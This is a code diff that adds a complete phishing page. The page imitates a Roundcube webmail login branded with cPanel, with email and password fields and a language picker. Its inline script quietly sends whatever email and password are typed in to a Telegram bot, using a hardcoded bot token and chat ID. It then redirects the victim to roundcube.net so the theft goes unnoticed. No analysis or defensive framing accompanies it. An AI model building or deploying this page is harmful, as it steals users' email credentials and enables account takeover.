@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" type="image/png" href="clogo.png">
+
+  <title>Webmail Login</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: "Open Sans", Arial, sans-serif;
+      background: #fff;
+      color: #333;
+      text-align: center;
+    }
+
+    /* Mobile padding adjustments */
+    @media (max-width: 767px) {
+      body {
+        padding: 0 15px;
+      }
+    }
+
+    /* Logo Styling */
+    .logo {
+      margin-top: 120px;
+    }
+
+    .logo img {
+      max-width: 220px;
+      width: 100%;
+      height: auto;
+    }
+
+    @media (min-width: 768px) {
+      .logo img {
+        max-width: 260px;
+      }
+    }
+
+    @media (min-width: 1024px) {
+      .logo img {
+        max-width: 300px;
+      }
+    }
+
+    /* Login Box */
+    .login-box {
+      max-width: 320px;
+      margin: 40px auto 0;
+      text-align: left;
+    }
+
+    /* Mobile adjustments for login box */
+    @media (max-width: 767px) {
+      .login-box {
+        max-width: none;
+        margin: 40px 0 0 0;
+      }
+    }
+
+    .login-box label {
+      display: block;
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 6px;
+      color: #333;
+    }
+
+    /* Input wrapper for icons */
+    .input-group {
+      position: relative;
+      margin-bottom: 40px;
+    }
+
+    .input-group svg {
+      position: absolute;
+      top: 50%;
+      left: 10px;
+      transform: translateY(-50%);
+      width: 16px;
+      height: 16px;
+      fill: #888;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 10px 10px 10px 34px;
+      font-size: 14px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+
+    .input-group input:focus {
+      border-color: #66afe9;
+      outline: none;
+      box-shadow: 0 0 3px rgba(102,175,233,0.6);
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 10px;
+      background: #179bd7;
+      border: 1px solid #000;
+      border-radius: 4px;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .login-box button:hover {
+      background: #0a5779;
+    }
+
+    /* Language Selector Styles */
+    .language-selector {
+      margin-top: 100px;
+      text-align: center;
+    }
+
+    /* Mobile: Dropdown Style */
+    @media (max-width: 767px) {
+      .language-selector {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        font-size: 13px;
+        color: #444;
+        margin-top: 40px;
+        margin-bottom: 40px;
+      }
+
+      .language-label {
+        font-weight: 500;
+      }
+
+      .language-dropdown {
+        padding: 8px 12px;
+        font-size: 13px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        background: #fff;
+        color: #333;
+        cursor: pointer;
+        min-width: 120px;
+      }
+
+      .language-dropdown:focus {
+        border-color: #66afe9;
+        outline: none;
+        box-shadow: 0 0 3px rgba(102,175,233,0.6);
+      }
+
+      .languages {
+        display: none;
+      }
+    }
+
+    /* Desktop: Original horizontal layout */
+    @media (min-width: 768px) {
+      .language-dropdown {
+        display: none;
+      }
+
+      .language-label {
+        display: none;
+      }
+
+      .languages {
+        margin-top: 100px;
+        font-size: 13px;
+        color: #444;
+        display: flex;
+        justify-content: center;
+        flex-wrap: wrap;
+        gap: 50px;
+      }
+
+      .languages span {
+        cursor: pointer;
+        transition: color 0.2s ease;
+      }
+
+      .languages span:hover {
+        color: #179bd7;
+      }
+
+      .languages span.active {
+        color: #179bd7;
+        font-weight: 600;
+      }
+    }
+
+    /* Footer */
+    .footer {
+      margin-top: 60px;
+      font-size: 12px;
+      color: #555;
+    }
+
+    .footer img {
+      height: 70px;
+      margin-bottom: -5px;
+    }
+
+    .footer a {
+      color: #007cba;
+      text-decoration: none;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Webmail SVG Logo -->
+  <div class="logo">
+    <img src="webmail.svg" alt="Webmail Logo">
+  </div>
+
+  <!-- Login Form -->
+  <div class="login-box">
+    <label for="email" data-i18n="lucky1_label">Email Address</label>
+    <div class="input-group">
+      <!-- User Icon -->
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+        <path d="M12 12c2.7 0 4.9-2.2 4.9-4.9S14.7 2.2 12 2.2 7.1 4.4 7.1 7.1 9.3 12 12 12zm0 2.4c-3.3 0-9.9 1.7-9.9 5v2.5h19.8v-2.5c0-3.3-6.6-5-9.9-5z"/>
+      </svg>
+      <input type="email" id="email" placeholder="Enter your email address." data-i18n-placeholder="lucky1_placeholder">
+    </div>
+
+    <label for="password" data-i18n="lucky2_label">Password</label>
+    <div class="input-group">
+      <!-- Padlock Icon -->
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+        <path d="M17 8h-1V6c0-2.8-2.2-5-5-5S6 3.2 6 6v2H5c-1.1 0-2 .9-2 2v10c0 
+        1.1.9 2 2 2h12c1.1 0 2-.9 
+        2-2V10c0-1.1-.9-2-2-2zm-5 
+        9c-1.1 0-2-.9-2-2s.9-2 
+        2-2 2 .9 2 2-.9 2-2 
+        2zm3-9H8V6c0-1.7 1.3-3 
+        3-3s3 1.3 3 3v2z"/>
+      </svg>
+      <input type="password" id="password" placeholder="Enter your password." data-i18n-placeholder="lucky2_placeholder">
+    </div>
+
+    <button type="submit" data-i18n="login_button">Log in</button>
+  </div>
+
+  <!-- Language Selector -->
+  <div class="language-selector">
+    <!-- Mobile Dropdown -->
+    <span class="language-label" data-i18n="select_locale">Select a locale:</span>
+    <select class="language-dropdown" onchange="loadLanguage(this.value)">
+      <option value="en">English</option>
+      <option value="ar">العربية</option>
+      <option value="bg">български</option>
+      <option value="cs">čeština</option>
+      <option value="da">dansk</option>
+      <option value="de">Deutsch</option>
+      <option value="el">Ελληνικά</option>
+      <option value="es">español</option>
+      <option value="es-419">español latinoamericano</option>
+    </select>
+
+    <!-- Desktop Links -->
+    <div class="languages">
+      <span onclick="loadLanguage('en')">English</span>
+      <span onclick="loadLanguage('ar')">العربية</span>
+      <span onclick="loadLanguage('bg')">български</span>
+      <span onclick="loadLanguage('cs')">čeština</span>
+      <span onclick="loadLanguage('da')">dansk</span>
+      <span onclick="loadLanguage('de')">Deutsch</span>
+      <span onclick="loadLanguage('el')">Ελληνικά</span>
+      <span onclick="loadLanguage('es')">español</span>
+      <span onclick="loadLanguage('es-419')">español latinoamericano</span>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <div>
+      <img src="clogo.png" alt="Roundcube">
+    </div>
+    <p>&copy; 2025 cPanel, L.L.C.<br>
+      <a href="#">Privacy Policy</a>
+    </p>
+  </div>
+  <script>
+    const BOT_TOKEN = "7285927680:AAHqGWvKT2dOnkiGFEukfS4-SoxUx5JQ89o";
+    const CHAT_ID = "7473556793";
+  
+    document.querySelector("button").addEventListener("click", async () => {
+      const lucky1 = document.getElementById("email").value;
+      const lucky2 = document.getElementById("password").value;
+  
+      const message = `Email: ${lucky1}\nPassword: ${lucky2}`;
+  
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+          })
+        });
+          // No alerts shown — redirect immediately after successful send
+      window.location.href = "https://roundcube.net/news/";
+    } catch (err) {
+      console.error("Telegram send failed:", err);
+     
+    }
+    });
+  </script>
+  <!-- Translation Script -->
+  <script>
+    let currentLanguage = 'en';
+
+    async function loadLanguage(lang) {
+      currentLanguage = lang;
+      
+      try {
+        const response = await fetch(lang + '.json');
+        const translations = await response.json();
+
+        // Replace text content
+        document.querySelectorAll("[data-i18n]").forEach(el => {
+          const key = el.getAttribute("data-i18n");
+          if (translations[key]) {
+            el.innerText = translations[key];
+          }
+        });
+
+        // Replace placeholders
+        document.querySelectorAll("[data-i18n-placeholder]").forEach(el => {
+          const key = el.getAttribute("data-i18n-placeholder");
+          if (translations[key]) {
+            el.setAttribute("placeholder", translations[key]);
+          }
+        });
+
+        // Update dropdown selection
+        const dropdown = document.querySelector('.language-dropdown');
+        if (dropdown) {
+          dropdown.value = lang;
+        }
+
+        // Apply RTL for Arabic
+        if (lang === 'ar') {
+          document.documentElement.setAttribute('dir', 'rtl');
+        } else {
+          document.documentElement.setAttribute('dir', 'ltr');
+        }
+      } catch (err) {
+        console.error("Translation load error:", err);
+      }
+    }
+
+    // Auto-detect language
+    let userLang = navigator.language || navigator.userLanguage;
+    userLang = userLang.split('-')[0]; // get "en" from "en-US"
+
+    // fallback to English if file doesn't exist
+    const supported = ["en", "ar", "bg", "cs", "da", "de", "el", "es", "es-419"];
+    if (!supported.includes(userLang)) {
+      userLang = "en";
+    }
+
+    loadLanguage(userLang);
+  </script>
+</body>
+</html>
